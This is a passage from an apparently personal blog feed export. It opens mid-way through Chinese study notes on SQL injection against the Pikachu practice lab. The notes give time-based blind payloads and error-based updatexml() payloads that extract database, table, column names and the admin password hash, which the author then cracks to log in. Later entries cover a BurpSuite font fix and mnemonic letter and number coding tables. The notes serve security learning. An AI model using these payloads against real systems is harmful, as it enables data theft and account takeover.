if(substr(database(),1,1)='p',sleep(5),null)#'</code></pre><p>以此类推继续爆破得到数据库名为：<code>pikachu</code>，接下来继续爆破数据库中的表名。</p></li><li><p><strong>爆数据表名称</strong></p><p>由以上操作得到数据库名称<code>pikachu</code>后，还要继续使用<code>if</code>判断语句结合<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数以及<code>union select</code>来爆数据表的名称信息。可构造payload如下：</p><pre class=" language-mysql"><code class="language-mysql"># 直接匹配字符vince' and if(substr((select table_name from information_schema.tables where table_schema='pikachu' limit 0,1),1,1)='p',sleep(5),null)## 匹配字符的ASCIIvince' and if(ascii(substr((select table_name from information_schema.tables where table_schema='pikachu' limit 0,1),1,1))=112,sleep(5),null)#vince' and if(ord(substr((select table_name from information_schema.tables where table_schema='pikachu' limit 0,1),1,1))=112,sleep(5),null)#</code></pre><p>操作结果如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Time注入-爆httpinfo表名1.png" alt="Time注入-爆httpinfo表名1"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Time注入-爆httpinfo表名2.png" alt="Time注入-爆httpinfo表名2"></center><p>以此类推爆破得到表名为：<code>httpinfo</code>，不是我们想要的数据表，因此需要修改<code>limit</code>参数继续爆破表名。最后在<code>limit 3 1</code>处爆破得到<code>users</code>表。</p></li><li><p><strong>爆users表字段名称</strong></p><p>由以上操作得到数据表名称<code>users</code>后，还要继续使用<code>if</code>判断语句结合<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数以及<code>union select</code>来爆<code>users</code>的字段名称。可构造payload如下：</p><pre class=" language-mysql"><code class="language-mysql"># 直接匹配字符vince' and if(substr((select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 0,1),1,1)='p',sleep(5),null)## 匹配字符的ASCIIvince' and if(ascii(substr((select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 0,1),1,1))=112,sleep(5),null)#vince' and if(ord(substr((select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 0,1),1,1))=112,sleep(5),null)#</code></pre><p>操作结果如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Time注入-爆字段名称失败.png" alt="Time注入-爆字段名称失败"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Time注入-爆字段名称成功.png" alt="Time注入-爆字段名称成功"></center><p>以此类推爆破得到字段名为：<code>id</code>，不是我们在意的数据，因此需要修改<code>limit</code>参数继续爆破字段名。最后在<code>limit 1 1</code>处爆破得到<code>username</code>字段名，在<code>limit 2 1</code>处爆破得到<code>password</code>字段名。</p></li><li><p><strong>爆users表字段值</strong></p><p>由以上操作得知<code>users</code>表存在<code>username</code>和<code>password</code>字段后，还要继续使用<code>if</code>判断语句结合<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数以及<code>union select</code>来爆<code>users</code>的字段名称。可构造payload如下：</p><pre class=" language-mysql"><code class="language-mysql"># 直接匹配字符vince' and if(substr((select username from users limit 0,1),1,1)='p',sleep(5),null)## 匹配字符的ASCIIvince' and if(ascii(substr((select username from users limit 0,1),1,1))=112,sleep(5),null)#vince' and if(ord(substr((select username from users limit 0,1),1,1))=112,sleep(5),null)#</code></pre><p>操作结果如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Time注入-爆字段值失败.png" alt="Time注入-爆字段值失败"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Time注入-爆字段值成功.png" alt="Time注入-爆字段值成功"></center><p>以此类推爆破得到用户名为：<code>admin</code>，修改<code>username</code>为<code>password</code>继续爆破得到密码为：<code>e10adc3949ba59abbe56e057f20f883e</code></p></li><li><p><strong>尝试爆破MD5</strong>:</p><p>使用<a href="https://cmd5.com/" target="_blank" rel="noopener">在线md5</a>爆破得到<code>admin</code>用户密码为：<code>123456</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-爆破得到admin用户密码.png" alt="union注入-爆破得到admin用户密码"></center></li><li><p><strong>尝试使用爆破的账号和密码登录后台</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-union爆破登录后台.png" alt="union注入-union爆破登录后台"></center></li></ol><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="技巧思路"><a href="#技巧思路" class="headerlink" title="技巧思路"></a>技巧思路</h2><p>​        在MySQL中使用一些指定的函数来制造报错，从而从报错信息中获取设定的信息，常见的<code>select/insert/update/delete</code>注入都可以使用报错方式来获取信息。</p><h2 id="背景条件"><a href="#背景条件" class="headerlink" title="背景条件"></a>背景条件</h2><p>​        后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端。</p><h2 id="三个常用的用来报错的函数"><a href="#三个常用的用来报错的函数" class="headerlink" title="三个常用的用来报错的函数"></a>三个常用的用来报错的函数</h2><ul><li><code>updatexml()</code>：函数是MySQL对XML文档数据进行查询和修改的XPATH函数。</li><li><code>extractvalue()</code>：函数也是MySQL对XML文档函数进行查询和修改的XPATH函数。</li><li><code>floor()</code>：是MySQL中用来取整的函数。</li></ul><h2 id="基于报错的信息获取"><a href="#基于报错的信息获取" class="headerlink" title="基于报错的信息获取"></a>基于报错的信息获取</h2><p><code>updatexml(XML_document,XPath_string,new_value)</code>;</p><ul><li><code>XML_document</code>是<code>String</code>格式，为XML文档对象的名称。</li><li><code>XPath_string</code>XPath格式的字符串。</li><li><code>new_value</code>String格式，替换查找到的符合条件的数据。</li></ul><h2 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h2><p><strong>环境</strong>：piakchu搜索型注入</p><ol><li><p>使用<code>updatexml()</code>爆数据库版本信息</p><ul><li>输入：<code>x&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#</code>，反馈如下图所示。</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入获取数据库版本信息.png"><ul><li>payload：<code>x&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#</code><ul><li>x:任意值</li></ul></li></ul></li></ol><ol start="2"><li><p>使用<code>updatexml()</code>爆数据库当前用户</p><ul><li>输入：<code>x&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)#</code>，反馈如下图所示。</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入获取数据库当前用户信息.png"><ul><li>payload：<code>x&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)#</code><ul><li>x:任意值</li></ul></li></ul></li></ol><ol start="3"><li><p>使用<code>updatexml()</code>爆数据库名称</p><ul><li>输入：<code>x&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code>，反馈如下图所示。</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入获取当前数据库名称.png"><ul><li>payload：<code>x&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code><ul><li>x:任意值</li></ul></li></ul></li></ol><ol start="4"><li><p>使用<code>updatexml()</code>爆数据库中的表名</p><ul><li>输入：<code>x&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 3,1),0x7e),1)#</code>，反馈如下图所示。</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入获取数据表名称.png"><ul><li>payload：<code>x&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 3,1),0x7e),1)#</code><ul><li>x:任意值</li><li>3:取第四行数据</li></ul></li></ul></li></ol><ol start="5"><li><p>使用<code>updatexml()</code>爆数据表中的字段名</p><ul><li>输入：<code>x&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 2,1),0x7e),1)#</code>，反馈如下图所示。</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入获取数据表中的字段名.png"><ul><li>payload：<code>x&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 2,1),0x7e),1)#</code><ul><li>x:任意值</li><li>2:取第三行数据</li></ul></li></ul></li></ol><ol start="6"><li><p>使用<code>updatexml()</code>爆数据表中的字段值</p><ul><li>输入：<code>x&#39; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)#</code>，反馈如下图所示。</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入获取数据表中的字段值.png"><ul><li><p>payload：<code>x&#39; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)#</code></p><ul><li>x:任意值</li></ul></li><li><p>但此payload不能完整地将超过31位的字段值展示出来，需要做以下改进。</p></li><li><p>输入：<code>x&#39; and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),1,16),0x7e),1)#</code>，先获取password字段值的前16位。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入获取password字段值前16位.png"></li><li><p>输入：<code>x&#39; and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),17,16),0x7e),1)#</code>，再获取password字段值的后16位。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入获取password字段值后16位.png"></li><li><p>拼接起来的password字段值为：<code>e10adc3949ba59abbe56e057f20f883e</code>，爆破出来的值为：<code>123456</code>。</p></li></ul></li></ol><ul><li><p>扩展：username、password字段值同时显示</p><ul><li><p>输入：<code>x&#39; and updatexml(0x7e,concat(0x7e,((select concat(username,0x7e,password) from users limit 0,1))),0)#</code>，反馈如下图所示。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入同时爆username和password字段值信息.png"></li><li><p>payload：<code>x&#39; and updatexml(0x7e,concat(0x7e,((select concat(username,0x7e,password) from users limit 0,1))),0)#</code></p></li></ul></li></ul><p><strong>解析</strong>：</p><p>拼接的SQL语句为：</p><pre class=" language-mysql"><code class="language-mysql"># 爆数据库版本信息select username,id,email from member where username like '%x' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#%'# 爆当前用户信息select username,id,email from member where username like '%x' and updatexml(1,concat(0x7e,(select user()),0x7e),1)#%'# 爆当前数据库名称信息select username,id,email from member where username like '%x' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#%'# 爆数据库中表信息select username,id,email from member where username like '%x' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 3,1),0x7e),1)#%'# 爆数据表中字段名信息select username,id,email from member where username like '%x' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 1,1),0x7e),1)#%'# 爆数据表中字段值信息select username,id,email from member where username like '%x' and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)#%'# 爆password字段值前16位select username,id,email from member where username like '%x' and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),1,16),0x7e),1)#%'# 爆password字段值后16位select username,id,email from member where username like '%x' and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),17,16),0x7e),1)#%'# 同时爆username和password字段值select username,id,email from member where username like '%x' and updatexml(0x7e,concat(0x7e,((select concat(username,0x7e,password) from users limit 0,1))),0)#%'</code></pre><h1 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h1><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h1 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h1><h1 id="Base64注入"><a href="#Base64注入" class="headerlink" title="Base64注入"></a>Base64注入</h1><h1 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h1>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
            <tag> 安全 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决BurpSuite Response中文乱码</title>
      <link href="/2020/09/05/jie-jue-burpsuite-response-zhong-wen-luan-ma/"/>
      <url>/2020/09/05/jie-jue-burpsuite-response-zhong-wen-luan-ma/</url>
      
        <content type="html"><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>&emsp;&emsp;在使用BurpSuite的<code>Repeater</code>模块进行注入点判断时，发现<code>Response</code>中的中文简体显示为乱码。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/BurpSuite/ResponseGarbled/Response简体中文显示乱码.png" alt="Response简体中文显示乱码"></center><h1 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h1><ul><li>Windows 10</li><li>Burp Suite Pro_2020.8</li></ul><h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><p>&emsp;&emsp;出现乱码通常都是由于编码格式产生的。现在计算机的编码格式有许多中，ASCII是一种较早使用的编码格式，随后出现的Big5、UTF系列、GB2312等都属于编码，这么多编码的存在主要是一些历史原因导致的，这与计算机的产生与发展有着密切的联系。这里不做具体介绍，只做简单说明，一个相同的8(16、32)位二进制在不同编码格式中可能显示为不同的符号，若在该编码格式中没有相对应的符号译码时可能以乱码的形式显示。</p><p>&emsp;&emsp;由以上推论可知，此问题产生的原因很有可能是因为Response返回报文的编码和BurpSuite文本显示的编码不兼容导致的。要解决该问题只需要修改BurpSuite显示的编码格式即可。但是主要的问题不在这里。</p><p>&emsp;&emsp;查看<code>Response Header</code>可以看到<code>Content-Type</code>的<code>charset</code>值为<code>UTF-8</code>，而且在<code>BurpSuite</code>的<code>Useroptions</code>的<code>CharacterSets</code>设置为：<code>Recognize automatically based on massage headers</code>，也即显示字符根据消息头中的编码格式决定，UTF-8是可以对中文进行正常译码的，所以这里不是由于字符编码产生的问题。</p><p>&emsp;&emsp;<code>CharacterSets</code>的上一个选项为<code>HTTPMessageDisplay</code>是对HTTP信息的显示进行设置，其中Font用于设置<code>BurpSuite</code>显示的字体样式，默认显示的字体样式支持英文字母，但其不支持中文，所以就在<code>Response</code>中显示了乱码。解决办法很简单，只需要重新设置一个支持中文显示的字体样式即可。</p><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>在打开的<code>BurpSuite</code>中点击【<code>User options</code>】选项，展示【<code>Display</code>】选项卡内容。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/BurpSuite/ResponseGarbled/UserOptions-Display选项卡.png" alt="UserOptions-Display选项卡"></center></li><li><p>设置<code>HTTPMessageDisplay</code>中的<code>Font</code>值为：<code>宋体 11pt</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/BurpSuite/ResponseGarbled/UserOptions-设置font值.png" alt="UserOptions-设置font值"></center></li><li><p>完美解决Response中文乱码问题。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/BurpSuite/ResponseGarbled/Response中文正常显示.png" alt="Response中文正常显示"></center></li></ol><h1 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h1><p>&emsp;&emsp;在文本显示时，所依赖的不只是其编码的格式，文本显示字体库也是需要考虑的一方面。例如有的字体库中只包含英文字母、阿拉伯数字、英文符号，当使用这个字体库去显示中文或其他不以英文字母组合的字时，计算机强制执行后得不到我们想要的结果。而在平时我们考虑乱码时通常都是只考虑编码的问题，那时因为你当前使用的字体库可能已经包含中文或其他样式的字符。所以<font color="red">在出现乱码的情况下需要编码和字体两方面结合考虑</font>。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.jianshu.com/p/ef3ce7ad71e8" target="_blank" rel="noopener">实战Burpsuite Response返回中文乱码问题</a></p>]]></content>
      
      
      <categories>
          
          <category> debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编码 </tag>
            
            <tag> BurpSuite </tag>
            
            <tag> 字体 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字母编码系统-动物版</title>
      <link href="/2020/09/02/zi-mu-bian-ma-xi-tong-dong-wu-ban/"/>
      <url>/2020/09/02/zi-mu-bian-ma-xi-tong-dong-wu-ban/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">字母</th><th align="center">编码(汉字)</th><th align="center">编码(英文)</th><th align="center">图像</th></tr></thead><tbody><tr><td align="center">A</td><td align="center">蚂蚁</td><td align="center">ant</td><td align="center"></td></tr><tr><td align="center">B</td><td align="center">鸟</td><td align="center">bird</td><td align="center"></td></tr><tr><td align="center">C</td><td align="center">鸡</td><td align="center">chicken</td><td align="center"></td></tr><tr><td align="center">D</td><td align="center">鹿</td><td align="center">deer</td><td align="center"></td></tr><tr><td align="center">E</td><td align="center">象</td><td align="center">elephant</td><td align="center"></td></tr><tr><td align="center">F</td><td align="center">狐狸</td><td align="center">fox</td><td align="center"></td></tr><tr><td align="center">G</td><td align="center">山羊</td><td align="center">goat</td><td align="center"></td></tr><tr><td align="center">H</td><td align="center">马</td><td align="center">horse</td><td align="center"></td></tr><tr><td align="center">I</td><td align="center">鹮</td><td align="center">ibis</td><td align="center"></td></tr><tr><td align="center">J</td><td align="center">水母</td><td align="center">jellyfish</td><td align="center"></td></tr><tr><td align="center">K</td><td align="center">考拉</td><td align="center">koala</td><td align="center"></td></tr><tr><td align="center">L</td><td align="center">狮子</td><td align="center">lion</td><td align="center"></td></tr><tr><td align="center">M</td><td align="center">猴子</td><td align="center">monkey</td><td align="center"></td></tr><tr><td align="center">N</td><td align="center">夜莺</td><td align="center">nightingale</td><td align="center"></td></tr><tr><td align="center">O</td><td align="center">猫头鹰</td><td align="center">owl</td><td align="center"></td></tr><tr><td align="center">P</td><td align="center">猪</td><td align="center">pig</td><td align="center"></td></tr><tr><td align="center">Q</td><td align="center">蜂王</td><td align="center">queen bee</td><td align="center"></td></tr><tr><td align="center">R</td><td align="center">兔子</td><td align="center">rabbit</td><td align="center"></td></tr><tr><td align="center">S</td><td align="center">蜘蛛</td><td align="center">spider</td><td align="center"></td></tr><tr><td align="center">T</td><td align="center">老虎</td><td align="center">tiger</td><td align="center"></td></tr><tr><td align="center">U</td><td align="center">独角兽</td><td align="center">unicorn</td><td align="center"></td></tr><tr><td align="center">V</td><td align="center">田鼠</td><td align="center">vole</td><td align="center"></td></tr><tr><td align="center">W</td><td align="center">狼</td><td align="center">wolf</td><td align="center"></td></tr><tr><td align="center">X</td><td align="center">北极鸥</td><td align="center">xeme</td><td align="center"></td></tr><tr><td align="center">Y</td><td align="center">牦牛</td><td align="center">yak</td><td align="center"></td></tr><tr><td align="center">Z</td><td align="center">斑马</td><td align="center">zebra</td><td align="center"></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 知识宫殿 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字母编码 </tag>
            
            <tag> 编码系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字母编码系统</title>
      <link href="/2020/09/02/zi-mu-bian-ma-xi-tong/"/>
      <url>/2020/09/02/zi-mu-bian-ma-xi-tong/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">字母</th><th align="center">编码</th><th align="center">关联</th><th align="center">图像</th></tr></thead><tbody><tr><td align="center">A</td><td align="center">苹果</td><td align="center">apple</td><td align="center"></td></tr><tr><td align="center">B</td><td align="center">香蕉</td><td align="center">banana</td><td align="center"></td></tr><tr><td align="center">C</td><td align="center">月亮</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">D</td><td align="center">弟弟</td><td align="center">【读音】</td><td align="center"></td></tr><tr><td align="center">E</td><td align="center">鹅</td><td align="center">【读音】</td><td align="center"></td></tr><tr><td align="center">F</td><td align="center">斧头</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">G</td><td align="center">哥哥</td><td align="center">【读音】</td><td align="center"></td></tr><tr><td align="center">H</td><td align="center">椅子</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">I</td><td align="center">蜡烛</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">J</td><td align="center">鱼钩</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">K</td><td align="center">机关枪</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">L</td><td align="center">柠檬</td><td align="center">lemon</td><td align="center"></td></tr><tr><td align="center">M</td><td align="center">麦当劳</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">N</td><td align="center">门</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">O</td><td align="center">橙子</td><td align="center">orange</td><td align="center"></td></tr><tr><td align="center">P</td><td align="center">梨</td><td align="center">pear</td><td align="center"></td></tr><tr><td align="center">Q</td><td align="center">气球</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">R</td><td align="center">小草</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">S</td><td align="center">蛇</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">T</td><td align="center">伞</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">U</td><td align="center">水杯</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">V</td><td align="center">漏斗</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">W</td><td align="center">皇冠</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">X</td><td align="center">剪刀</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">Y</td><td align="center">衣杆</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">Z</td><td align="center">闪电</td><td align="center">【形状】</td><td align="center"></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 知识宫殿 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字母编码 </tag>
            
            <tag> 编码系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字编码系统</title>
      <link href="/2020/09/02/shu-zi-bian-ma-xi-tong/"/>
      <url>/2020/09/02/shu-zi-bian-ma-xi-tong/</url>
      
        <content type="html"><![CDATA[<center><font size="20" weight="100">数字编码系统v1.0</font></center><table><thead><tr><th align="center">数字</th><th align="center">编码方式</th><th align="center">编码</th><th align="center">图片</th></tr></thead><tbody><tr><td align="center">00</td><td align="center">形状</td><td align="center">望远镜</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/00望远镜.png"></td></tr><tr><td align="center">01</td><td align="center">形状：草坪0，树1</td><td align="center">小树</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/01小树.png"></td></tr><tr><td align="center">02</td><td align="center">谐音</td><td align="center">铃儿</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/02铃儿.png"></td></tr><tr><td align="center">03</td><td align="center">形状：0是凳面，1是凳腿</td><td align="center">三角凳</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/03三角凳.png"></td></tr><tr><td align="center">04</td><td align="center">形状+数量：4个圆轮子</td><td align="center">小汽车</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/04轿车.png"></td></tr><tr><td align="center">05</td><td align="center">形状+数量：5个圆手指</td><td align="center">手套</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/05手套.png"></td></tr><tr><td align="center">06</td><td align="center">形状+数量：6发子弹</td><td align="center">手枪</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/06手枪.png"></td></tr><tr><td align="center">07</td><td align="center">谐音</td><td align="center">令旗</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/07令旗.png"></td></tr><tr><td align="center">08</td><td align="center">形状：8个圆轮子</td><td align="center">溜冰鞋</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/08溜冰鞋.png"></td></tr><tr><td align="center">09</td><td align="center">常识：猫有9条命</td><td align="center">猫</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/09猫.png"></td></tr><tr><td align="center">10</td><td align="center">形状</td><td align="center">棒球</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/10棒球.png"></td></tr><tr><td align="center">11</td><td align="center">形状</td><td align="center">筷子</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/11筷子.png"></td></tr><tr><td align="center">12</td><td align="center">谐音</td><td align="center">椅儿</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/12椅儿.png"></td></tr><tr><td align="center">13</td><td align="center">谐音</td><td align="center">医生</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/13医生.png"></td></tr><tr><td align="center">14</td><td align="center">谐音</td><td align="center">钥匙</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/14钥匙.png"></td></tr><tr><td align="center">15</td><td align="center">谐音</td><td align="center">鹦鹉</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/15鹦鹉.png"></td></tr><tr><td align="center">16</td><td align="center">谐音</td><td align="center">石榴</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/16石榴.png"></td></tr><tr><td align="center">17</td><td align="center">谐音</td><td align="center">仪器</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/17仪器.png"></td></tr><tr><td align="center">18</td><td align="center">谐音</td><td align="center">腰包</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/18腰包.png"></td></tr><tr><td align="center">19</td><td align="center">谐音</td><td align="center">药酒</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/19药酒.png"></td></tr><tr><td align="center">20</td><td align="center">常识：一盒2支</td><td align="center">香烟</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/20香烟.png"></td></tr><tr><td align="center">21</td><td align="center">谐音</td><td align="center">鳄鱼</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/21鳄鱼.png"></td></tr><tr><td align="center">22</td><td align="center">形状：衣服上有2</td><td align="center">双胞胎</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/22双胞胎.png"></td></tr><tr><td align="center">23</td><td align="center">谐音</td><td align="center">耳塞</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/23耳塞.png"></td></tr><tr><td align="center">24</td><td align="center">常识：一天24小时</td><td align="center">闹钟</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/24闹钟.png"></td></tr><tr><td align="center">25</td><td align="center">谐音</td><td align="center">二胡</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/25二胡.png"></td></tr><tr><td align="center">26</td><td align="center">谐音</td><td align="center">河流</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/26河流.png"></td></tr><tr><td align="center">27</td><td align="center">谐音</td><td align="center">耳机</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/27耳机.png"></td></tr><tr><td align="center">28</td><td align="center">谐音</td><td align="center">恶霸</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/28恶霸.png"></td></tr><tr><td align="center">29</td><td align="center">谐音</td><td align="center">饿囚</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/29饿囚.png"></td></tr><tr><td align="center">30</td><td align="center">谐音</td><td align="center">三轮车</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/30三轮车.png"></td></tr><tr><td align="center">31</td><td align="center">谐音</td><td align="center">鲨鱼</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/31鲨鱼.png"></td></tr><tr><td align="center">32</td><td align="center">谐音</td><td align="center">扇儿</td><td align="center"><img 